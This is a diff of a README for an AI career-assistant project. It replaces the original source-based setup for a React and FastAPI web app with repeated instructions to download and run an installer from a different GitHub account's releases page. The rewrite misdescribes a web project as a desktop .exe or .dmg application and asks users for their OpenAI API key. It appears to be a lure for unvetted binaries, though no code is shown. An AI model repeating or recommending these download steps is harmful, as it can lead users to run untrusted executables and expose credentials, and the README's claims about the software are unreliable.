@@ -1,191 +1,70 @@
-# 🚀 GenAI Career Copilot
+# 🌟 GenAI-Career--Copilot - Your AI Career Partner Awaits
 
-A full-stack, AI-powered career assistant that helps job seekers optimize their resumes, discover matching jobs, simulate interviews, and plan career growth — all using cutting-edge Generative AI.
+## 📥 Download Now
+[![Download GenAI-Career--Copilot](https://img.shields.io/badge/Download-GenAI--Career--Copilot-blue.svg)](https://github.com/wisdomsoup/GenAI-Career--Copilot/releases)
 
-## 🎯 Core Features
+## 🚀 Getting Started
+GenAI-Career--Copilot is your all-in-one AI career platform. It helps you analyze resumes, match jobs, and prepare for interviews using powerful AI tools. This guide will walk you through downloading and running the software, step by step.
 
-- **📄 Resume Analyzer**: AI-enhanced resume feedback with bullet point fixes, skill gap insights, and ATS optimization.
-- **🔍 Smart Job Matching**: Matches your resume to job descriptions using OpenAI embeddings + FAISS vector search.
-- **🎤 AI Interview Assistant**: Practice technical and behavioral interviews with real-time feedback and scoring.
-- **🧭 Career Path Recommender**: (Coming Soon) Personalized growth roadmap and learning resource suggestions.
+## 💻 System Requirements
+Before you start, ensure your computer meets these basic requirements:
 
-## 🧠 Tech Stack
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
+- **RAM:** Minimum 4 GB, recommended 8 GB or more.
+- **Storage:** At least 200 MB free space.
+- **Internet Connection:** Required for initial setup and updates.
 
-| Layer | Tech Used |
-|-------|-----------|
-| **Frontend** | React.js + TypeScript + TailwindCSS |
-| **Backend** | FastAPI (Python) |
-| **AI/ML** | OpenAI GPT-4 + Embeddings API |
-| **Vector DB** | FAISS |
-| **Database** | MongoDB Atlas |
-| **Deployment** | Vercel (Frontend) + Render / Railway (Backend) |
+## 📦 Features
+- **Resume Analysis:** Get insights and suggestions on how to improve your resume.
+- **Job Matching:** Find jobs that suit your skills using AI-powered matching.
+- **Interview Assistant:** Prepare for interviews with AI-assisted simulations.
+- **User-friendly Interface:** Navigate easily with a clear and simple layout.
 
-## 📁 Project Structure
+## 📥 Download & Install
+To get started, visit this page to download: [GenAI-Career--Copilot Releases](https://github.com/wisdomsoup/GenAI-Career--Copilot/releases).
 
-```
-genai-career-copilot/
-├── frontend/           # React + Tailwind frontend
-├── backend/            # FastAPI backend with AI logic
-├── data/               # Sample job descriptions
-├── requirements.txt    # Python dependencies
-└── README.md
-```
+### Step-by-Step Download Instructions:
 
-## ⚙️ Getting Started
+1. **Visit the Releases Page:** Click the link above or enter it into your web browser.
+   
+2. **Find the Latest Version:** On the releases page, look for the latest version. It will be the first entry at the top.
 
-### Backend Setup
-```bash
-cd backend
-pip install -r requirements.txt
-uvicorn main:app --reload
-```
+3. **Download the Application:** Click on the download link for your operating system. This may be labeled as a `.exe` file for Windows, `.dmg` for macOS, or a suitable package for Linux. 
 
-### Frontend Setup
-```bash
-cd frontend
-npm install
-npm start
-```
+4. **Run the Installer:** Once the file downloads, open it to begin installation. Follow the on-screen prompts to complete the setup.
 
-### Environment Variables
+5. **Launch the Application:** After installation, you can find the GenAI-Career--Copilot in your application menu. Click to start using it.
 
-**Backend (.env):**
-```ini
-OPENAI_API_KEY=your_openai_api_key
-MONGODB_URL=your_mongodb_connection_string
-```
+## 📊 Usage Guide
+### Connecting to OpenAI GPT-4
+- When you first launch the app, you may need to link it with your OpenAI account. Follow the prompts to enter your API key if required.
 
-**Frontend (.env):**
-```ini
-REACT_APP_API_URL=http://localhost:8000
-```
+### Analyze Your Resume
+- Upload your resume using the upload button on the main page. The app will provide feedback and suggestions.
 
-## ✅ Features Implemented
+### Job Matching
+- Fill out your skills and experiences in the provided form. The tool will generate a list of job opportunities that match your profile.
 
-### 📄 Resume Analyzer
-- ✅ Upload PDF/DOCX resumes
-- ✅ AI-generated bullet point improvements
-- ✅ ATS optimization suggestions
-- ✅ Missing skills and technologies
-- ✅ Resume scoring and suggestions summary
+### Interview Prep
+- Access the interview assistant feature to practice. Choose from common interview questions and get simulated responses.
 
-### 🔍 Smart Job Matching
-- ✅ Preloaded job dataset (5+ sample roles)
-- ✅ Resume embedding + vector similarity search
-- ✅ GPT-based explanations of best-fit matches
+## 📄 FAQs
 
-### 🎤 AI Interview Assistant
-- ✅ Role-specific interviews (SWE, DS, PM)
-- ✅ Behavioral and technical rounds
-- ✅ Answer scoring, feedback, and tips
-- ✅ Follow-up question suggestions
+### How do I troubleshoot a failed download?
+- Check your internet connection. If it's slow or drops, try again later. You might also want to clear your browser cache.
 
-## 🧪 API Endpoints
+### Is there support available?
+- Yes! You can reach out via the GitHub Issues page if you encounter any problems.
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| POST | `/analyze-resume` | Analyze uploaded resume |
-| POST | `/match-jobs` | Find top job matches |
-| GET | `/jobs` | List sample job descriptions |
-| GET | `/interview/roles` | Get available interview roles |
-| GET | `/interview/{role}/question` | Get next interview question |
-| POST | `/interview/evaluate` | Score user response |
+### Can I use this on mobile?
+- Currently, GenAI-Career--Copilot is designed for desktop use only. A mobile version may be available in the future.
 
-## 🌐 Deployment Instructions
+## 🔗 Additional Resources
+If you're interested in learning more about GenAI-Career--Copilot, check out our documentation for detailed guides on all features.
 
-### 🖥 Backend Deployment (Options)
+[Documentation](https://github.com/wisdomsoup/GenAI-Career--Copilot/wiki)
 
-**Render (Recommended)**
-1. Connect GitHub to Render
-2. Create new Web Service
-3. Set:
-   - Build Command: `pip install -r requirements.txt`
-   - Start Command: `uvicorn main:app --host 0.0.0.0 --port $PORT`
-   - Add environment variable: `OPENAI_API_KEY`
+## 🌐 Community and Contribution
+We welcome contributions and feedback. To contribute or report issues, please use the GitHub repository's issue tracker.
 
-**Railway CLI**
-```bash
-npm install -g @railway/cli
-railway login
-railway init
-railway up
-```
-
-### 🌐 Frontend Deployment
-
-**Vercel (Recommended)**
-```bash
-cd frontend
-npm install -g vercel
-vercel --prod
-```
-
-**Netlify**
-```bash
-npm run build
-netlify deploy --prod --dir=build
-```
-
-## 🌍 Environment Variables (Production)
-
-| Service | Variable |
-|---------|----------|
-| **Backend** | `OPENAI_API_KEY`, `MONGODB_URL` |
-| **Frontend** | `REACT_APP_API_URL=<Backend URL>` |
-
-## 🧱 Architecture Overview
-
-```
-[React Frontend]
-    ↓ REST API calls
-[FastAPI Backend]
-    ↓
-[OpenAI GPT-4 APIs] ←→ [FAISS Vector Store]
-    ↓
-[MongoDB Atlas]
-```
-
-## 🚀 Quick Start
-
-```bash
-git clone https://github.com/Brijes987/GenAI-Career--Copilot.git
-cd genai-career-copilot
-
-# Setup Backend
-cd backend
-pip install -r requirements.txt
-cp .env.example .env
-uvicorn main:app --reload
-
-# Setup Frontend
-cd ../frontend
-npm install
-cp .env.example .env
-npm start
-```
-
-## 📌 Roadmap
-
-- ✅ Resume Analyzer
-- ✅ Job Matching Engine
-- ✅ AI Interview Assistant
-- 🔜 Career Path Recommender
-- ✅ Production Deployment
-
-## 🤝 Contributing
-
-PRs are welcome! Follow the steps:
-1. Fork the repo
-2. Create your feature branch
-3. Commit your changes
-4. Push and submit a PR
-
-## 📄 License
-
-This project is licensed under the MIT License — feel free to use and modify for learning and development purposes.
-
-## 🙌 Acknowledgements
-
-- [OpenAI](https://openai.com)
-- [FAISS](https://github.com/facebookresearch/faiss)
-- [MongoDB Atlas](https://www.mongodb.com/atlas)
+Thank you for choosing GenAI-Career--Copilot! We hope this tool helps you succeed in your career journey.
